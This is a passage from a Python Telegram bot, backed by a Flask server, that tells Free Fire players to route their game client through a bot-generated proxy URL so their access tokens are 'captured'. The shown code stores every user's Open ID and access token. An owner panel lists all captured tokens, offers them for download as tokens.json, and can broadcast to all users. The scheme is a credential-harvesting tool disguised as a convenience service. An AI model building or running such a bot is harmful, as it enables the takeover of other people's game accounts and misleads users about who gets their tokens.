    "<b>📭 ɴᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ꜰᴏᴜɴᴅ</b>\n\n"
    "ɴᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ʜᴀᴠᴇ ʙᴇᴇɴ ᴄᴀᴘᴛᴜʀᴇᴅ ʏᴇᴛ.\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴛᴏᴋᴇɴ:</b>\n\n"
    "1. ᴄʟɪᴄᴋ <b>🔗 ᴄʀᴇᴀᴛᴇ ᴜʀʟ</b> ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇʀᴠᴇʀ ᴜʀʟ.\n"
    "2. ᴄʀᴇᴀᴛᴇ ᴏʀ ᴜᴘᴅᴀᴛᴇ <code>localconfig.json</code> ᴡɪᴛʜ ᴛʜᴀᴛ ᴜʀʟ.\n"
    "3. ᴘʟᴀᴄᴇ ᴛʜᴇ ꜰɪʟᴇ ɪɴ ᴛʜᴇ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ.\n"
    "4. ᴏᴘᴇɴ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b> ᴀɴᴅ ʟᴏɢ ɪɴ.\n"
    "5. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴘʀᴇss <b>ᴄʜᴇᴄᴋ ᴛᴏᴋᴇɴ</b> ᴛᴏ ᴠɪᴇᴡ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ."
            )
            return
        
        lines = [f"<b>🎫 Your Access Tokens ({len(tokens)})</b>\n"]
        for i, t in enumerate(tokens, 1):
            lines.append(
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>Access Token {i}</b>\n"
                f"🆔 <b>Open ID:</b> <code>{t[2]}</code>\n"
                f"🔑 <b>Access Token:</b> <code>{t[3]}</code>\n"
                f"⏰ <b>Time:</b> {t[4]}\n"
            )
        
        token_text = "\n".join(lines)
        
        if len(token_text) > 4000:
            for chunk in [token_text[i:i+3900] for i in range(0, len(token_text), 3900)]:
                await update.message.reply_html(chunk.strip())
        else:
            await update.message.reply_html(token_text)
    
    elif text == f"👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ":
        await update.message.reply_html(
    f"<b>👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b>\n\n"
    f"👤 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ:</b> {DEV_USERNAME}\n"
    f"🤖 <b>ʙᴏᴛ:</b> {BOT_USERNAME}\n"
    f"📢 <b>ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ:</b> {CHANNEL_USERNAME}\n\n"
    f"<b>ᴀʙᴏᴜᴛ:</b>\n"
    f"<i>ᴛʜɪs ʙᴏᴛ ɪs ᴅᴇsɪɢɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ ᴄʀᴇᴀᴛᴇ ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ "
    f"ᴄᴀᴘᴛᴜʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴇᴀsɪʟʏ. "
    f"ꜰᴏʀ ᴜᴘᴅᴀᴛᴇs, sᴜᴘᴘᴏʀᴛ, ᴏʀ ᴀssɪsᴛᴀɴᴄᴇ, ꜰᴏʟʟᴏᴡ ᴛʜᴇ ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ.</i>\n\n"
    f"❤️ <i>ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜsɪɴɢ ᴏᴜʀ ʙᴏᴛ!</i>"
        )
    
    elif text == "🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ" and user_id == OWNER_ID:
        await show_owner_panel(update, context)

# ================== OWNER PANEL ==================
async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAINTENANCE_MODE
    total_users = db_get_total_users()
    total_tokens = db_get_total_tokens()
    maint_status = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"
    
    panel_text = (
        f"<b>👑 Owner Control Panel</b>\n\n"
        f"<b>📊 Statistics:</b>\n"
        f"👥 Total Users: <b>{total_users}</b>\n"
        f"🎫 Total Tokens: <b>{total_tokens}</b>\n"
        f"🔧 Maintenance: <b>{maint_status}</b>\n\n"
        f"<b>🔧 Select an option below:</b>"
    )
    
    keyboard = [
        [InlineKeyboardButton("ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴛᴏᴋᴇɴs", callback_data="owner_dl_tokens")],
        [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_broadcast")],
        [InlineKeyboardButton("ʙᴀɴ ᴜsᴇʀ", callback_data="owner_ban")],
        [InlineKeyboardButton("ᴜɴʙᴀɴ ᴜsᴇʀ", callback_data="owner_unban")],
        [InlineKeyboardButton("🛠️ Maintenance ON", callback_data="owner_maint_on") if not MAINTENANCE_MODE else InlineKeyboardButton("✅ Maintenance OFF", callback_data="owner_maint_off")],
        [InlineKeyboardButton("🔙 ᴍᴀɪɴ", callback_data="owner_back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_html(panel_text, reply_markup=reply_markup)

async def owner_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global MAINTENANCE_MODE
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id != OWNER_ID:
        await query.edit_message_text("❌ Unauthorized access.")
        return
    
    data = query.data
    
    if data == "owner_users":
        users = db_get_all_users()
        if not users:
            await query.edit_message_text("No users found.")
            return
        
        text = f"<b>ᴀʟʟ ᴜsᴇʀs ({len(users)})</b>\n\n"
        for u in users:
            status = "🚫" if u[6] == 1 else "✅"
            text += f"{status} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4000:
            await query.message.reply_html(text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=reply_markup)
    
    elif data == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            await query.edit_message_text("No tokens captured yet.")
            return
        
        text = f"<b>ᴀʟʟ ᴛᴏᴋᴇɴs ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            text += (
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> <code>{t[1]}</code>\n"
                f"🆔 <b>Open ID:</b> <code>{t[2]}</code>\n"
                f"🔑 <b>Token:</b> <code>{t[3]}</code>\n"
                f"🕒 <b>Time:</b> {t[4]}\n"
            )
        
        if len(tokens) > 10:
            text += f"\n... and {len(tokens) - 10} more\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4000:
            await query.message.reply_html(text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=reply_markup)
    
    elif data == "owner_dl_tokens":
        if os.path.exists(TOKEN_JSON_PATH):
            with open(TOKEN_JSON_PATH, "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="tokens.json",
                    caption="📁 All tokens backup"
                )
        else:
            await query.edit_message_text("No tokens.json found.")
    
    elif data == "owner_broadcast":
        await query.edit_message_text(
            "<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴏᴅᴇ</b>\n\n"
            "<i>Send the message to broadcast to all users.</i>\n\n"
            "📝 <b>Send your message below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML"
        )
        context.user_data["awaiting_broadcast"] = True
    
    elif data == "owner_ban":
        await query.edit_message_text(
            "<b>🚫 ʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to ban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML"
        )
        context.user_data["awaiting_ban"] = True
    
    elif data == "owner_unban":
        await query.edit_message_text(
            "<b>✅ ᴜɴʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to unban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML"
        )
        context.user_data["awaiting_unban"] = True
    
    elif data == "owner_maint_on":
        MAINTENANCE_MODE = True
        db_set_maintenance(True)
        await query.edit_message_text(
            "✅ <b>Maintenance mode enabled!</b>\n\n"
            "Users will see maintenance message.\n"
            "Only you can still use the bot.",
            parse_mode="HTML"
        )
    
    elif data == "owner_maint_off":
        MAINTENANCE_MODE = False
        db_set_maintenance(False)
        await query.edit_message_text(
            "✅ <b>Maintenance mode disabled!</b>\n\n"
            "Bot is now fully operational.",
            parse_mode="HTML"
        )
    
    elif data == "owner_back":
        await show_owner_panel_callback(query, context)

async def show_owner_panel_callback(query, context):
    global MAINTENANCE_MODE
    total_users = db_get_total_users()
    total_tokens = db_get_total_tokens()
    maint_status = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"
    
    panel_text = (
        f"<b>👑 ᴏᴡɴᴇʀ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ</b>\n\n"
        f"📊 <b>Statistics</b>\n"
        f"👥 <b>Total Users:</b> <code>{total_users}</code>\n"
        f"🎫 <b>Total Tokens:</b> <code>{total_tokens}</code>\n"
        f"🔧 <b>Maintenance:</b> {maint_status}\n\n"
        f"🛠️ <b>Options</b>"
    )
    
    keyboard = [
        [InlineKeyboardButton("ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴛᴏᴋᴇɴs", callback_data="owner_dl_tokens")],
        [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_broadcast")],
        [InlineKeyboardButton("ʙᴀɴ ᴜsᴇʀ", callback_data="owner_ban")],
        [InlineKeyboardButton("ᴜɴʙᴀɴ ᴜsᴇʀ", callback_data="owner_unban")],
        [InlineKeyboardButton("🛠️ Maintenance ON", callback_data="owner_maint_on") if not MAINTENANCE_MODE else InlineKeyboardButton("✅ Maintenance OFF", callback_data="owner_maint_off")],
        [InlineKeyboardButton("🔙 ᴍᴀɪɴ", callback_data="owner_back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(panel_text, parse_mode="HTML", reply_markup=reply_markup)

# ================== ADMIN INPUT HANDLER ==================
async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    
    if context.user_data.get("awaiting_broadcast"):
        text = update.message.text
        if text == "/cancel":
            context.user_data["awaiting_broadcast"] = False
            await update.message.reply_text("❌ Broadcast cancelled.", reply_markup=get_user_keyboard(user_id))
            return
        
        context.user_data["awaiting_broadcast"] = False
        
        users = db_get_all_users()
        sent_count = 0
        failed_count = 0
        
        progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
        
        for u in users:
            uid = u[0]
            if u[6] == 1:
                continue
            try:
                await context.bot.send_message(chat_id=uid, text=f"{text}", parse_mode="HTML")
                sent_count += 1
                await asyncio.sleep(0.03)
            except:
                failed_count += 1
        
        db_save_broadcast(text, sent_count)
        
        await progress_msg.edit_text(
            f"<b>✅ Broadcast Complete!</b>\n\n"
            f"📨 Sent: <b>{sent_count}</b>\n"
            f"❌ Failed: <b>{failed_count}</b>\n"
            f"👥 Total: <b>{len(users)}</b>",
            parse_mode="HTML"
        )
        
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_user_keyboard(user_id))
        return
    
    if context.user_data.get("awaiting_ban"):
        text = update.message.text.strip()
        if text == "/cancel":
            context.user_data["awaiting_ban"] = False
            await update.message.reply_text("❌ Ban cancelled.", reply_markup=get_user_keyboard(user_id))
            return
        
        try:
            target_id = int(text)
            db_ban_user(target_id, True)
            await update.message.reply_text(f"✅ User <code>{target_id}</code> banned!", parse_mode="HTML")
        except ValueError:
            await update.message.reply_text("❌ Invalid ID.")
        
        context.user_data["awaiting_ban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_user_keyboard(user_id))
        return
    
    if context.user_data.get("awaiting_unban"):
        text = update.message.text.strip()
        if text == "/cancel":
            context.user_data["awaiting_unban"] = False
            await update.message.reply_text("❌ Unban cancelled.", reply_markup=get_user_keyboard(user_id))
            return
        
        try:
            target_id = int(text)
            db_ban_user(target_id, False)
            await update.message.reply_text(f"✅ User <code>{target_id}</code> unbanned!", parse_mode="HTML")
        except ValueError:
            await update.message.reply_text("❌ Invalid ID.")
        
        context.user_data["awaiting_unban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_user_keyboard(user_id))
        return

# ================== MESSAGE HANDLER ==================
async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    
    if context.user_data.get("awaiting_broadcast") or context.user_data.get("awaiting_ban") or context.user_data.get("awaiting_unban"):
        await handle_admin_input(update, context)
        return
    
    if update.message and update.message.text:
        await handle_buttons(update, context)

# ================== ERROR HANDLER ==================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        error_str = str(context.error)
        if "Message is not modified" in error_str:
            return
        if "Chat not found" in error_str:
            return
        print(f"[!] Error: {error_str[:100]}")
    except:
        pass

# ================== RUN BOT ==================
def run_bot():
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(check_joined_callback, pattern="check_joined"))
    application.add_handler(CallbackQueryHandler(owner_callback_handler, pattern="^owner_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_messages))
    application.add_error_handler(error_handler)
    
    print("🤖 Telegram Bot Started (Polling)...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print("✅ Multi-user: Enabled")
    print("✅ Duplicate Prevention: Active")
    print("✅ Ban/Unban System: Active")
    print("✅ Error Handler: Active")
    application.run_polling()

# ================== START ==================
if __name__ == '__main__':
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True), daemon=True)
    flask_thread.start()
    
    time.sleep(1.5)
    print(f"🌐 Server Running On http://{LOCAL_IP}:{PORT}")
    
    run_bot()